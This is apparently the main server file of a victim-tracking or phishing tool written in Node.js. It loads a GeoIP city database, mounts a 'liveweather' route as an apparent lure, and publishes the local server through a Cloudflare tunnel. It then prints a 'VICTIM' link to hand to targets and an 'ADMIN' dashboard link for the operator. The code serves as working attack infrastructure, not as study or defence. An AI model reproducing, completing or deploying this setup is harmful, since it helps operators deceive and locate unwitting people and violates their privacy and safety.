const { tunnel: cloudflaredTunnel } = require("cloudflared")
const cookieParser = require("cookie-parser")
const socketIO = require("socket.io")
const maxmind = require("maxmind")
const path = require("path")
const fs = require("fs")
const config = require("./config")
const express = require("express")
const tarkine = require("tarkine")
const http = require('http')

const app = express()
const server = http.createServer(app)
const io = new socketIO.Server(server)
const PORT = process.env.PORT || config.port
global.remoteURL
global.geoipReader = null

global.IO = io

app.set("view engine", "html")
app.engine("html", tarkine.renderFile)
app.use(cookieParser())
app.use(express.urlencoded({ extended: false }))
app.use(express.static(__dirname + "/public"))
app.use(express.json())

app.use("/", require("./router"))
app.use("/", require("./liveweather"))

server.listen(PORT, async () => {
    console.log(`✅ Server listening on http://localhost:${PORT}`)
    
    // Initialize GeoIP reader
    const dbPath = path.join(__dirname, "geoip", "GeoLite2-City.mmdb")
    if (fs.existsSync(dbPath)) {
        try {
            global.geoipReader = await maxmind.open(dbPath)
            console.log("✅ GeoIP database loaded successfully")
        } catch (error) {
            console.warn("⚠️  GeoIP database load failed:", error.message)
        }
    } else {
        console.warn("⚠️  GeoIP database not found at", dbPath)
        console.log("📥 Run: npm run setup-geoip")
    }

    const localURL = `http://localhost:${PORT}`
    
    // Setup tunnel in background
    ;(async () => {
        try {
            console.log("🌐 Initializing Cloudflare tunnel...")
            const tunnel = await cloudflaredTunnel({
                "--url": localURL
            })
            
            // The tunnel object itself might be a Promise, need to get the URL
            let remoteUrl
            if (tunnel && typeof tunnel === 'object') {
                // Try different possible property names
                remoteUrl = tunnel.url || tunnel.publicUrl || tunnel || String(tunnel)
            }
            
            // If it's still a promise, await it
            if (remoteUrl && typeof remoteUrl.then === 'function') {
                remoteUrl = await remoteUrl
            }
            
            global.remoteURL = remoteUrl
            console.log(`✅ Tunnel ready: ${global.remoteURL}`)
            
            console.log(`\n=== REMOTE LINKS NOW ACTIVE ===`)
            console.log(`🎯 VICTIM: ${global.remoteURL}`)
            console.log(`👁️  ADMIN:  ${global.remoteURL}/admin?key=${config.adminKey}`)
            console.log(`================================\n`)
        } catch (err) {
            console.warn("⚠️  Tunnel failed:", err.message)
            console.log("📍 Using LOCAL access only\n")
        }
    })()
    
    // Show local links immediately
    setTimeout(() => {
        console.log(`\n=== LOCAL LINKS (AVAILABLE NOW) ===`)
        console.log(`\n🎯 VICTIM:`)
        console.log(`   ${localURL}`)
        console.log(`\n👁️  ADMIN DASHBOARD:`)
        console.log(`   ${localURL}/admin?key=${config.adminKey}`)
        console.log(`\n=====================================\n`)
    }, 500)
})